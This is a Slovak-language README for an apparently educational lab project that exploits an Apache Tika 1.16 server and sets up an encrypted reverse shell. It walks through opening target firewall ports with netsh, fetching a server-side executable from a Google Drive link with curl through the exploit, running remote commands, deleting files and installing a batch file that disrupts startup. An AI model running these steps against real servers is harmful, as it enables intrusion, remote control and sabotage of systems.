# IC1-projekt

## Obsah repozitara
V repozitary su 3 zlozky :
### build
Tu sa nachadza iba subor `build.bat` ktory zkompiluje vsetky zdrojaky do 4 exe suborov :
1. **client_side** - cast virtualneho terminalu ktora sa spusta na klientovy (utocnik) ked uz boli otvorene porty pomocou exploitu.
2. **server_side** - cast virtualneho terminalu ktora sa spusta na servery ma 2 argumenty *[ip_addr_ca, ip_addr_client]*. 
3. **exploit** - subor ktory utoci na tika server, spusta sa na klientovy.
4. **CertificateAuthority** - Certifikacna autorita ktora sluzy ako tretia strana pri sifrovanej komunikacii medzi sererom a klientom.
### exploit 
V tejto zlozke sa nachadza subor `commands_list.txt` v ktorom su napisane 2 prikazy na otvorenie portov na serveri pre komunikaciu z CA (4444) a klientom (3333).
V subore `exploit.py` su zdrojove kody pre exploit.exe
### virtual_cmd
V tejto zlozke su zdrojove kody pre sifrovanu komunikaciu v zlozke `communication` a subory su zdrojove kody pre client_side.exe a server_side.exe respektivne.

## Ako spustit exploit
- na serveri najprv musime spustit tika server stiahnut sa da tu : https://archive.apache.org/dist/tika/tika-server-1.16.jar a nainstalovat javu
- po stiahnuti je treba nastavit firewall pravidlo pre tika server a to cez graficke rozrhanie cez : 
    -  Inbound Rules 
    - New rule
    - Program 
    - Nastavit cestu na tika server 
    - Allow connection 
    - vsetky oblasti 
    - meno : tika_server_allow  
- prikazom : `java -jar tika-server-1.16.jar -h [ip_addresa_servera]`
- funckionalitu je potreba vyskat tak ze na utocnikovej strane si ovtvorime prehliadac a "*ip_addresa_server*:9998"
- na utocnikovej strane je potrebne vypnut windows defender a windows firewall
- ako prove si musime stiahnut potrebne subory, v subore `commands_list.txt` sa nachadazju linky na 3. potrebne .exe subory 
    -   `exploit.exe`
    -   `client_side.exe`
    -   `CertificateAuthority.exe`
- exploit.exe je potrebne spustit na utocnikovej strane v cmd z pravami administratora
- po zadani IP adresy je mozne zadavat prikazy zo suboru commands_list a to prve dve : 
    -   `netsh advfirewall firewall add rule name="Allow port 3333" dir=in action=allow protocol=TCP localport=3333`
    -   `netsh advfirewall firewall add rule name="Allow port 4444" dir=in action=allow protocol=TCP localport=4444`
- dalej je potrebne spustit CertificateAuthority.exe v novom terminaly z administrativnimy pravami
- v terminaly kde je spusteny exploit.exe je potrebne stiahnut subor server_side.exe
    -   `curl -L -o server_side.exe "https://drive.google.com/uc?export=download&id=1MWQaEGF5sdziP5qQR7zLXzuNJT_CAgcj"` 
- tento subor nasledovne stiahneme z prikazom server_side.exe *[ip_adresa_certifikacne_autority]* *[ip_adresa_klienta]*
- potom spustime na klientovy subor client_side.exe a zvolime ip adresu CA *(localhost v tomto pripade)* a serveru
- ak vsetko prebehlo ako malu virtualne cmd je inicializovane a je mozne sa pohybovat v adresarovej strukture servera a zadavat prikazy a ziskat aj output tychto prikazov
- dalej je mozne si stiahnut subor `disturb_system.bat` pomocou prikazu v `commands_list.txt` ktory rusit beh systemu po starte

## Struktura navodu
1. zprovoznit tika server na serveri
2. zprovoznit exploit uviezt niake priklady napr. spustit kalkulacku, vypnut system
3. nastavit firewall pravidla cez prikazy na serveri prostrednictvom exploitu
4. spustenie reverse shellu
5. ukazka prikazov vymazanie suborov, vypis adresaru servera v terminalu klienta cez reverse shell 
6. samostatna uloha prenos niakeho suboru z jedneho pocitaca na druhy (to este musim vymisliet ako tak to potom doplnim ja)
